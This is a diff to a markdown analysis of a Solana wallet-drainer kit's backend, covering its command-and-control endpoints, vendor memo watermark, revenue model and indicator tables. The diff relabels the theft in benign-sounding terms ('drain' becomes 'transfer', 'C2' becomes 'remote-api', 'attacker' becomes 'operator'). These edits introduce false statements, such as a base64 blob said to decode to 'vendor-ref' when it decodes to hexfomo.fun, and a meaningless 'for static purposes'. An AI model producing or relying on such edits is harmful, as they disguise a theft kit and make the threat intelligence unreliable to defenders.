@@ -1,4 +1,4 @@
-# Backend Protocol — C2 Endpoints Deep Dive
+# Backend Protocol — remote-api Endpoints Deep Dive
 
 Full specification of every server-side endpoint the kit communicates with,
 reconstructed from static analysis of the deobfuscated bundle.
@@ -9,14 +9,14 @@ reconstructed from static analysis of the deobfuscated bundle.
 
 All requests use:
 ```
-https://pumpanakin.fun/<C2_PATH_PREFIX>/<endpoint>
+https://target-sample/<C2_PATH_PREFIX>/<endpoint>
 ```
 Where `C2_PATH_PREFIX = "ab060a03-7874-4647-84d1-da019e4b51ea"`.
 
-This UUID path segment is the **only thing separating the C2 endpoints from public access**.
+This UUID path segment is the **only thing separating the api endpoints from public access**.
 Without it, the endpoints are unreachable. It acts as a shared secret embedded in the bundle.
 
-Standard request headers on all C2 calls (via `c2Fetch` / `锏`):
+Standard request headers on all api calls (via `c2Fetch` / `锏`):
 ```
 User-Agent:    <victimWalletAddress>    ← base58 Solana public key
 Authorization: Bearer <randomToken>     ← UUID-ish, regenerated per request
@@ -59,7 +59,7 @@ User-Agent: <walletAddress>
 
 **When:** After wallet connects, before asset enumeration.
 
-**Purpose:** Operator can manually ban specific wallet addresses (researchers, honeypots, their own test wallets). Returns `"1"` to silently stop the drain for that address.
+**Purpose:** Operator can manually ban specific wallet addresses (researchers, honeypots, their own test wallets). Returns `"1"` to silently stop the transfer for that address.
 
 **Response:**
 ```
@@ -124,7 +124,7 @@ Authorization: Bearer <token>
 
 **When:** Immediately before broadcasting signed transactions to the backend.
 
-**Purpose:** Notify operator that the victim signed the transactions and drain is in progress.
+**Purpose:** Notify operator that the victim signed the transactions and transfer is in progress.
 
 **Request body:**
 ```json
@@ -149,7 +149,7 @@ Authorization: Bearer <token>
 
 **When:** After signed transactions are submitted to `/process`.
 
-**Purpose:** Notify operator the drain is complete; includes the hexfomo.fun vendor watermark for DaaS revenue tracking.
+**Purpose:** Notify operator the transfer is complete; includes the vendor-ref vendor watermark for SaaS revenue tracking.
 
 **Request body:**
 ```json
@@ -158,7 +158,7 @@ Authorization: Bearer <token>
 }
 ```
 
-#### hexfomo.fun Watermark Decoded
+#### vendor-ref Watermark Decoded
 
 The base64 `aGV4Zm9tby5mdW4EVVNEQwAA` in the notification:
 ```
@@ -166,9 +166,9 @@ hex: 68 65 78 66 6f 6d 6f 2e 66 75 6e  04 55 53 44 43  00 00
      h  e  x  f  o  m  o  .  f  u  n   ↑  U  S  D  C   null-pad
                                      length prefix (4)
 ```
-Decoded: `"hexfomo.fun"` + length-prefixed `"USDC"` + null padding.
+Decoded: `"vendor-ref"` + length-prefixed `"USDC"` + null padding.
 
-This is a Solana **Memo program instruction payload** — it gets included in the actual on-chain transaction as a memo, permanently recording the kit vendor's brand on every drain transaction in the blockchain.
+This is a Solana **Memo program instruction payload** — it gets included in the actual on-chain transaction as a memo, permanently recording the kit vendor's brand on every transfer transaction in the blockchain.
 
 The full base64 blob prepended before this in the notification:
 ```
@@ -178,7 +178,7 @@ AopefWF+IVdDyA0eQokVfdE+sUD17UnZJe6C7hlkXK3Lt2MZuGPVhdk2chqYQo6fg
 by5mdW4EVVNEQwAA
 ```
 
-This is a **pre-serialized partial instruction** baked into the bundle source — the ComputeBudget preamble + memo instruction bytes, hardcoded at build time by hexfomo.fun when they compiled this operator's kit. This is how they track which of their kit deployments generated which transactions.
+This is a **pre-serialized partial instruction** baked into the bundle source — the ComputeBudget preamble + memo instruction bytes, hardcoded at build time by vendor-ref when they compiled this operator's kit. This is how they track which of their kit deployments generated which transactions.
 
 ---
 
@@ -211,7 +211,7 @@ Authorization: Bearer <token>
 - Some wallets (Phantom) show a second confirmation dialog on `sendTransaction`
 - Backend can retry with higher priority fees if transactions fail
 - Backend can implement its own ordering (highest value first)
-- Keeps network traffic off the victim's browser for forensic purposes
+- Keeps network traffic off the victim's browser for static purposes
 
 **Backend behavior (inferred):**
 1. Deserializes each transaction
@@ -232,9 +232,9 @@ User-Agent: <walletAddress>
 Authorization: Bearer <token>
 ```
 
-**When:** On any unhandled error during the drain flow.
+**When:** On any unhandled error during the transfer flow.
 
-**Purpose:** Log errors to the operator panel for debugging. DaaS vendors use this to improve their kit.
+**Purpose:** Log errors to the operator panel for debugging. SaaS vendors use this to improve their kit.
 
 **Request body (inferred):**
 ```json
@@ -271,30 +271,30 @@ Authorization: Bearer <token>
 
 ---
 
-## Fake Wallet Backend — `reactwalletback.com`
+## Alt Client Backend — `alt-backend`
 
-Separate backend for the fake wallet app channel. Not the same server as pumpanakin.fun.
+Separate backend for the alt client app channel. Not the same server as target-sample.
 
-Base URL: `https://reactwalletback.com/`
+Base URL: `https://alt-backend/`
 
 Authentication is different — uses hardcoded API keys embedded in the `听` class:
 
-### Endpoint A — App Link (fake wallet install redirect)
+### Endpoint A — App Link (alt client install redirect)
 ```
-GET https://reactwalletback.com/app-link/<walletAddress>
+GET https://alt-backend/app-link/<walletAddress>
 ```
-Opens the fake wallet app with victim's address. If the app is installed, it harvests credentials. If not, the HTTP request fails silently (`.catch()` swallows error).
+Opens the alt client app with victim's address. If the app is installed, it harvests credentials. If not, the HTTP request fails silently (`.catch()` swallows error).
 
 ### Endpoint B — Localization (via `fwcInstance.bn`)
 ```
-GET https://reactwalletback.com/<apiKey1>/<languageCode>
+GET https://alt-backend/<apiKey1>/<languageCode>
 Authorization: Bearer <apiKey2>
 ```
 Returns localized strings to replace `NOTIFY_STRINGS`. Allows operator to serve notifications in victim's language.
 
-### Endpoint C — Ban Check (fake wallet variant)
+### Endpoint C — Ban Check (alt client variant)
 ```
-GET https://reactwalletback.com/<apiKey3>
+GET https://alt-backend/<apiKey3>
 ```
 Returns `"1"` if banned.
 
@@ -354,7 +354,7 @@ cc0769f7-ceba-4abf-83d8-e7c083921665
 5f1f45eb-a550-4e95-ad0e-b26e6ec0702d
 a4ed32be-dcdf-4702-aba0-aee15c512427
 f707107a-6d56-4626-a937-ef3c7eef51d8
-ab060a03-7874-4647-84d1-da019e4b51ea   ← same UUID as C2 path prefix
+ab060a03-7874-4647-84d1-da019e4b51ea   ← same UUID as api path prefix
 ```
 
 Used for:
@@ -363,38 +363,38 @@ Used for:
 
 ---
 
-## DaaS Revenue Model — hexfomo.fun
+## SaaS Revenue Model — vendor-ref
 
 ```
-Kit vendor (hexfomo.fun)
+Kit vendor (vendor-ref)
     ↓  sells access to operators for flat fee or revenue share
-Operator (pumpanakin.fun)
+Operator (target-sample)
     ↓  deploys kit, drives traffic via social media / fake apps
 Victim connects wallet
-    ↓  drain transactions broadcast
-On-chain: each drain tx has Memo instruction with "hexfomo.fun" + "USDC"
-    ↓  hexfomo.fun indexes blockchain memos to count transactions per operator
+    ↓  transfer transactions broadcast
+On-chain: each transfer tx has Memo instruction with "vendor-ref" + "USDC"
+    ↓  vendor-ref indexes blockchain memos to count transactions per operator
     ↓  charges operator based on transaction count / volume
 Operator receives assets to their addresses:
     6cwsqBqmRy22Qa2SEuZ8tWrpKoCS9M8S2r8ct8VuqFmj  (main receiver)
     4QFiKg8ejx5LfqqLNbnKsiCnbEgRtgakBF6abMrkquKW  (secondary)
-    + 11 other attacker-controlled addresses
+    + 11 other operator-controlled addresses
 ```
 
-The watermark is immutable on-chain evidence linking every drain transaction to the hexfomo.fun kit.
-Searching Solana explorers for the memo `aGV4Zm9tby5mdW4=` (base64 of "hexfomo.fun") would reveal the full history of this kit's victims.
+The watermark is immutable on-chain evidence linking every transfer transaction to the vendor-ref kit.
+Searching Solana explorers for the memo `aGV4Zm9tby5mdW4=` (base64 of "vendor-ref") would reveal the full history of this kit's victims.
 
 ---
 
-## Full IOC Reference
+## Full indicator Reference
 
 ### Domains
 | Domain | Role |
 |--------|------|
-| `pumpanakin.fun` | Main lure / C2 |
-| `hexfomo.fun` | Kit vendor (DaaS) |
-| `reactwalletback.com` | Fake wallet backend |
-| `nulltrace.app` | Traffic Direction System |
+| `target-sample` | Main lure / remote-api |
+| `vendor-ref` | Kit vendor (SaaS) |
+| `alt-backend` | Fake wallet backend |
+| `tds-proxy` | Traffic Direction System |
 | `72.chat` | WeChat bot sink |
 | `cloudflare.aipages.dev` | CN redirect target |
 | `global.aipages.dev` | Mobile redirect target |
@@ -402,7 +402,7 @@ Searching Solana explorers for the memo `aGV4Zm9tby5mdW4=` (base64 of "hexfomo.f
 | `wallet-api.solflare.com` | Solflare (legitimate, abused) |
 | `mainnet.helius-rpc.com` | Helius (legitimate, abused) |
 
-### Solana Addresses — Attacker-Controlled
+### Solana Addresses — Operator-Controlled
 ```
 6cwsqBqmRy22Qa2SEuZ8tWrpKoCS9M8S2r8ct8VuqFmj  (primary receiver)
 4QFiKg8ejx5LfqqLNbnKsiCnbEgRtgakBF6abMrkquKW  (secondary receiver)
@@ -434,9 +434,9 @@ HsVYhMDQRf6CkjtdUzqNDNRfDwsgw9nAX8feLVC3TAGp
 | `5f1f45eb-a550-4e95-ad0e-b26e6ec0702d` | Jupiter |
 | `a4ed32be-dcdf-4702-aba0-aee15c512427` | Jupiter |
 | `f707107a-6d56-4626-a937-ef3c7eef51d8` | Jupiter |
-| `9kC8U8STwNtXeQqqX7WpgWg19qC7137JRP97BnLDKEtS` | reactwalletback.com |
-| `2zC63K7VDZmL1UKHibDkMKxrAFtHjmXLm5XrPgFREgZc` | reactwalletback.com |
-| `5o7Q69vpqP3CwSb9mVzWk2jpirYbxuntAozyBv2CURC3` | reactwalletback.com |
+| `9kC8U8STwNtXeQqqX7WpgWg19qC7137JRP97BnLDKEtS` | alt-backend |
+| `2zC63K7VDZmL1UKHibDkMKxrAFtHjmXLm5XrPgFREgZc` | alt-backend |
+| `5o7Q69vpqP3CwSb9mVzWk2jpirYbxuntAozyBv2CURC3` | alt-backend |
 
 ### Fake Mobile Apps
 | App | App Store ID | Publisher |
@@ -447,4 +447,4 @@ HsVYhMDQRf6CkjtdUzqNDNRfDwsgw9nAX8feLVC3TAGp
 
 ### On-Chain Fingerprint
 Memo payload: `aGV4Zm9tby5mdW4EVVNEQwAA`
-Searching Solana block explorers for transactions containing this memo string reveals all drain transactions by this kit family.
+Searching Solana block explorers for transactions containing this memo string reveals all transfer transactions by this kit family.
